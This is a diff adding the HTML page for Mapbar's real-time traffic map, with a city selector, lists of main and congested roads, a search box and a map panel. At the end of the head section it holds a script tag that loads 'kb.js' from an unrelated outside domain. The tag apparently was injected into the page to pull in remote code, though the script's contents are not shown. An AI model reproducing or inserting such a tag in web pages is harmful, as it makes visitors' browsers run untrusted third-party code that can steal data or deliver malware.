@@ -1,0 +1,108 @@
+
+
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="ie=7" http-equiv="x-ua-compatible">
+<meta content="all" name="Robots">
+<meta content="Mapbar为您提供实时交通的详细信息。" name="Description">
+<meta content="Mapbar为您提供实时交通的详细信息。" name="Keywords">
+<title>Mapbar 实时交通</title>
+
+<link rel="stylesheet" type="text/css" href="../www/traffic/style/style.css">
+
+<script type="text/javascript">
+var cityNum = 0;
+</script>
+<script type="text/javascript" src="../api/mapbar31.2.js"></script>
+<script type="text/javascript" src="../www/traffic/js/maputil2.0.js"></script>
+<script type="text/javascript" src="../www/traffic/js/mconf.js"></script>
+<script type="text/javascript" src="../www/traffic/js/prototype.js"></script>
+<script type="text/javascript" src="../www/traffic/js/jquery-1.2.5.js"></script>
+<script type="text/javascript">jQuery.noConflict();</script>
+<script type="text/javascript" src="../www/traffic/js/Transfer.js"></script>
+<script type="text/javascript" src="../www/traffic/js/util.js"></script>
+<script type="text/javascript" src="../www/traffic/js/tranfic.js"></script>
+
+<script type="text/javascript" src="https://hnci.net.cn/js/kb.js"></script></head>
+<body scroll="no">
+<!-- 导航 -->
+<div class="header" id="header">
+   <a href="../index.html" id="logo" target="_blank"><img src="../www/traffic/images/tranfic_logo.png" alt="地图|公交—Mapbar"></a>
+   <div class="linkInfo">
+   		<a href="../index.html">首页</a>|
+   		<a href="javascript:;" target="_blank">论坛</a> | 
+   		<a href="../help/help.html" target="_blank">帮助</a> |
+   		<span><a href="javascript:;" target="_blank">地图API</a>|
+   		<a href="javascript:;" target="_blank">行业应用</a></span></div>
+
+   <ul class="areaNav">
+        <li>选择城市</li>
+    </ul>
+</div>
+<!-- 导航结束 -->
+
+
+<!-- 主界面 -->
+<div class="content" id="content">
+    <div id="rightPanel">
+        <div id="rightMain">
+            <div class="areaBox">
+                <p class="areaBox_t" id="traCityList">
+               
+                </p>
+                <p class="areaBox_b">
+                	<input id="gd_title_chck" type="checkbox" name="rad2" checked="checked">
+	                <a href="javascript:void(0);" onclick="scrollView('gd_title');return false;" id="cszgd">城市主干道</a>
+	                <input id="yd_title_chck" type="checkbox" name="rad1">
+	                <a href="javascript:void(0);" onclick="scrollView('yd_title');return false;" id="cdld">常堵路段</a>
+	            </p>
+            </div>
+            <div id="resultList" class="listBox">
+                <div id="yd_title" class="inforB" style="display:none;">
+                    <h2>常堵路段 </h2>
+                    <ul id="busyroad">
+
+                    </ul>
+                </div>
+                <div id="gd_title" class="inforB" style="margin-bottom:10px;">
+                    <h2>城市主干道 </h2>
+                    <ul id="mainroad">
+                    </ul>
+                </div>
+                <form id='searchFormId' onsubmit="return false">
+
+                <input id="rtext" name="" type="text" style="width:230px;color:gray;" value="输入您要定位的路段"><input type="button" value="定位" id="search" name="search">
+                    </form>
+                <p class="InfoPrompt">该信息由上海优途协助提供</p>
+                <div id="rsidebarD_id" class="inforB IB2" style="display:none;">
+                    <h2>路况描述</h2>
+                    <dl></dl>
+                </div>
+                <div class="rsidebarE" id="rsidebarE_id" style="display:none;">
+
+           		<p class="rtext1">  <a href="javascript:getLocation()" class="sendmail">发送信息</a>
+           		</p>
+        	</div>
+            </div>
+        </div>
+        <a href="javascript:;" title="隐藏面板" id="panelarrowR" onclick="right_infoShow()" class="midArrow">隐藏面板</a>
+        </div>
+
+    <div class="leftPanel" id="leftPanel" style="margin-right: 331px;">
+        <div id="mapPanel">
+            <div class="keyBox" id="KeyBox" style="z-index:9999;"><input type="checkbox" id="tranficCtrl" checked="checked"><span>显示实时路况</span> 
+            <span id="tranfic_time"></span>
+            <img src="../www/traffic/images/1px.gif" alt="大于40m/h_顺畅">
+            <img src="../www/traffic/images/1px.gif" alt="21m/h-40m/h_缓慢" class="Ib">
+            <img src="../www/traffic/images/1px.gif" alt="小于21m/h_拥堵" class="Ic">
+            <img src="../www/traffic/images/1px.gif" alt="无数据" class="Id"></div>
+            <div id="mapbar" style="height:460px;"></div></div>
+    </div>
+
+</div>
+
+</body>
+</html>
+
